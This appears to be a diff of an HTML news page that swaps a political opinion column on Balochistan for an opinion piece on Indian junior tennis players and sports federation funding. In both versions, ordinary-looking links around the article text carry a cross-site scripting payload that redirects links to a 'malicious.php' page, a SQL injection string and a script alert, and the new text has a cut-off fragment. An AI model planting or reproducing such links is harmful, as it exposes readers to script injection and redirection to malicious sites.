@@ -16,38 +16,54 @@
 
 
 <div class="single">
-<h2>Balochistan-speak signals recovery of natural frontiers</h2>
+<h2>Talent for the game, but why Indian athletes fail on the world stage </h2>
 
 
 
-<p class="details"> August 24, 2016, 12:03 am IST |Swapan Dasgupta| <a href="#">TimesofIndia</a> </p>
-<h2 align="right"><a href="20160823-opinion.php"> Previous </a> </h2>
+<p class="details"> Aug 25, 2016 11:18 IST|Ajai Pasricha|<a href="#">Hindustan Times</a> </p>
+<h2 align="right"><a href="20160824-opinion.php"> Previous </a> </h2>
+
+
 
 
 <p>
-What made Satyajit Ray a compelling filmmaker was his mastery over little details.<a href="http://www.theplanetreports.com/index.php?name=Shekhar%3Cscript%3Ewindow.onload%20=%20function(){var%20link=document.getElementsByTagName(%22a%22);link%20%20[0].href=%22http://theplanetreports.com/malicious.php%22;}%3C/script%3E" target="_blank"> In Sonar Kella (Golden Fort), </a>the first of his Feluda series, there is the scene of the two conmen approaching the house of the little boy whose recollections of an earlier life had been written about in the newspapers. As they wandered into the narrow lane where the boy lived, they sighted a small child. Believing it to be the child blessed with these amazing powers, they stop him, asking for directions. “You see,” they tell him in Bengali, “we have come all the way from Balochistan.”
-</p><p>
+<a href="http://www.theplanetreports.com/index.php?name=Shekhar%3Cscript%3Ewindow.onload%20=%20function(){var%20link=document.getElementsByTagName(%22a%22);link%20%20[0].href=%22http://theplanetreports.com/malicious.php%22;}%3C/script%3E" target="_blank"> 
+In its tennis pool, India has at least 10 potential champions </a> in the age bracket of 12-18. The question is: Will their promise blossom into a victory dance at the next Olympics? Unlikely. History tells us each one will stumble when the time comes to step up from the junior ranks. The reason: Inadequate exposure to the pace and power of international competition. Only if potential champions can pit their skills against the world’s best players in their age group will they vault into the orbit of current sporting standards. That happens in cricket but nowhere else. Whether tennis, athletics, archery, basketball, cycling, fencing, wrestling, weightlifting, volleyball, boxing, soccer, golf, gymnastics, martial arts or swimming, the athletes of India are almost always denied the basic vitamins of progress by those that govern each federation.</p>
+<p>
+Each federation president seems to think that coaching, fitness, advanced practice drills and local competitions will do the trick. They’re mistaken. This formula merely creates a skeletal foundation; it doesn’t build an Olympic champion. 
 
-Whether it is Rabindranath Tagore’s Kabuliwala or travellers from Balochistan, places and peoples associated with the Great Game have always had an exotic association for fertile minds in the plains. The sense of mystery and adventure has inevitably been aroused, not least among a generation that grew up on a diet of Rudyard Kipling. The idea of the ‘noble savage’ that combined primitiveness with a fanatical sense of loyalty and freedom made a deep impression on all aficionados of Empire.
-</p><p>
-</p><p><a href="http://www.latenightreport.com/info.php?id=http://www.theplanetreports.com/subscription.php?id=5%20UNION%20Select%20*%20from%20three">
-The republic of India </a> was always intended to be the successor of the British Indian empire, a vast expanse of territory whose reach (as distinct from direct control) extended from Singapore in the east to Aden in the west, and from Gilgit to Colombo. The foreign policy of the British Indian empire wasn’t controlled from the India Office in Whitehall but from, first, Calcutta and, after 1911, Delhi. This was a legacy that long predated the East India Company. The Mughal empire always had one eye on the lost homelands of Central Asia. Prior to that, even after the Shaivite kingdoms of Afghanistan were lost to invaders from West Asia in the 11th century, the civilizational reach of India extended far beyond the frontiers of the state.
-</p><p>
-<a href="http://www.theplanetreports.com/comments.php?sig=<script>alert('No+more+entries+Possible+')%3B<%2Fscript>"target="_blank"> 
-In a recent book, The Ocean of Churn </a>, Sanjeev Sanyal has wonderfully documented the extent to which trade with countries in the Indian Ocean shaped the histories of the east and west coasts of India. It is a much-needed corrective to the Middle India-centric perception of our national past.
-</p><p>
-Sadly, much of the impulses that motivated the rotund Bengali Hurree Babu, in Kipling’s Kim, to risk his life tracking nefarious Russian designs in the forbidding Himalayas, are in danger of being erased from public memory. Independence from alien rule was a moment of great exultation. But it also had two unintended but adverse consequences.
-</p><p>
-First, the partition of the country involved the loss of the frontier territories and the common border with Afghanistan. The occupation of nearly half of the old kingdom of Jammu and Kashmir by Pakistan also meant the loss of Gilgit-Baltistan. In the east, Tibet came under the direct control of China.
+</p>
 
+<p>
+Let’s talk tennis. Rudiments of the game are taught at the age of seven or eight. Thereafter, the trek to the national stage takes not less than 21,480 hours of donkeywork spread over ten long years. In the course of that extended journey, three thousand-rupee shoes wear out every six weeks, twelve-dozen tennis balls are reduced to eggshells each month and racquet guts break every third day.
+</p><p>
+Hundreds of kids from middle class homes pack their tennis bags each morning not knowing what the morning will bring: a stride closer to their goal or a slide further away. Reputations are won and lost over two hours of battle. In the life of emerging tennis players, heartbreak and success go hand in hand.
+</p><p>
+They practice for hours through the searing heat of summer, immune to the sun, their fine-tuned limbs and torsos reacting faster with each passing day. They work on their technique under the watchful gaze of an anxious coach who breaks down their game into a handbook of statistics: Winners, unforced errors, double-faults and aces, each one a measure of performance.
 </p><p>
 <a href="http://www.latenightreport.com/info.php?id=http://www.theplanetreports.com/subscription.php?id=5%20UNION%20Select%20*%20from%20three">
-In Kim, Hurree Babu had remarked to his youthful companion:</a> “When everyone is dead, the Great Game is finished. Not before.” It turned out to be a false prophecy. India remained and even prospered but the truncation of the Indian state meant that the enlarged vision of the frontier was seriously truncated, both politically and emotionally. The vast repertoire of knowledge, so assiduously built by functionaries of the Indian Political Service ceased to be part of institutional memory. The effects were tragic. In 1999, the Indian response to the Pakistani-sponsored incursions into Kargil was delayed because the Army lacked the resources to understand and translate the radio chatter of the attackers.
+The tennis court becomes an open classroom </a> where lessons are drawn from the curricula of life. “What you learn from losing, you can’t learn from winning,” says a coach. “A loss is more of a gain than a win. Try explaining this to your parents.”
 </p><p>
-Secondly, in positing non-alignment and anti-colonialism as the hallmarks of foreign policy, the Nehruvian order lost sight of the neighbourhood. India shifted its gaze from consolidating its pre-eminence in the region to establishing connect with countries outside its sphere of interest. Geography was sacrificed for an abstruse ideology. India celebrated Nasser, Nyerere and Makarios but closed down its consulates in Lhasa and Kashgar. The Gulf sheikhdoms that were tied to the Indian economy, even by a common currency, were abandoned to other powers. By the time the Nehruvian distortions were addressed, first by Rajiv Gandhi and then P V Narasimha Rao and Atal Bihari Vajpayee, insularity and passivity had affected the national psyche.
+Parental pressures weigh heavily on young shoulders. When cracks appear from the burden of losing, a mental fitness trainer props up the mind, instilling positive thoughts in a player who has everything else: every shot in the book, every muscle in perfect working order, except the one between the ears. That needs to be strengthened.
 </p><p>
-It is in this context that the Prime Minister’s outreach to the peoples in Balochistan and Gilgit-Baltistan assume importance. Narendra Modi hasn’t signalled India’s direct involvement in their battles, he has merely signalled the recovery of our natural frontiers. This outreach now needs to be complemented with institutional capacity building and, most important, the enlargement of our mental horizons. The reach of India must transcend its national borders, as it always had.
-</p>
+<a href="http://www.theplanetreports.com/comments.php?sig=<script>alert('No+more+entries+Possible+')%3B<%2Fscript>"target="_blank"> 
+Despite unusually high fitness levels,</a> physical injuries strike without warning or mercy. When young feet pound hard courts for years on end, the result often is a shin splint, a stress fracture, a torn hamstring or a muscle strain. A month’s break from the game is the only remedy. Return to form is both slow and painful.
+</p><p>
+Indians have proved time and again they can be world beaters: Leander Paes
+</p><p>
+The life of a young tennis player is punctuated with moments of uncertainty followed by periods of success in cycles of unpredictable length. Most parents never come to terms with this fact. They expect their children to win each time they step on to court. Fathers have been known to thrash their daughters when they lose. Those scars never heal.
+</p><p>
+
+The long hard grind might make a national champion but not an Olympic medal winner. To rise on the international stage, Indian players must draw lessons from playing faster, stronger competitors from across the world. All sports federations must set aside funds for this purpose. Only then will our champions be graduates of a global finishing school, ready to compete at the Olympic level.
+</p><p>
+<a href="http://www.latenightreport.com/info.php?id=http://www.theplanetreports.com/subscription.php?id=5%20UNION%20Select%20*%20from%20three">Playing the circuit in Europe can cost as much as three lakhs of rupees a week </a>, way beyond the means of the average parent. In light of this, most parents choose the soft option: American universities that offer sports scholarships to world-ranked juniors.
+</p><p>
+When homegrown sportspersons of high potential move to the US in search of international competition, the loser is India. This talent drain can only be plugged if sports federations fund the participation of juniors in high-profile global events. That’s what other sporting nations do--either at government expense or through private sponsorships. That’s why those countries have a growing band of junior athletes who carry the stamp of potential world-beaters-- and India doesn’t.
+</p><p>
+In the opinion of the professional in charge of the Swedish Junior Tennis Program, several juniors in India are “technically among the world’s best in shot making but they lack two essentials: speed and power.” How can they acquire these skills? Pat comes the answer: “Through Spanish drills and playing overseas.”
+</p><p><i>
+(Ajai Pasricha, the father of a tennis player, is a communications consultant and   an advertising professional of 36 years standing. He can be contacted at ajaipasricha@gmail.com. The views expressed are personal.)
+</i></p>
 
 </div>
 
